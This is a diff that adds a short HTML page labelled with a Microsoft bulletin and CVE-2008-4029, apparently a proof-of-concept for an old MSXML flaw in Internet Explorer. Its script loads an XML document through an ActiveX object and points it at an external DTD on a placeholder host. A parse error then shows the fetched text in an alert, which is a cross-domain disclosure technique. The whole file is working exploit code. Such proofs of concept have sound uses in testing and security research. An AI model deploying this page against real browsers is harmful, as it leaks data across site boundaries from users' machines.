@@ -1,0 +1,16 @@
+&lt;html&gt;
+&lt;body&gt;
+KB955218 - CVE-2008-4029 - JA
+&lt;script type=&quot;text/javascript&quot;&gt;
+var dom = new ActiveXObject(&quot;Msxml2.DOMDocument.3.0&quot;);
+dom.async = false;
+var url = &quot;http://www.example.com/forfun.dtd&quot;;
+var xml = &quot;&lt;!DOCTYPE pwn SYSTEM &#039;&quot; + url + &quot;&#039;&gt;&quot;;
+if (dom.loadXML(xml) == 0)
+{
+	alert(&quot;Blue or Red Pill? &quot; + dom.parseError.srcText);
+}
+&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+
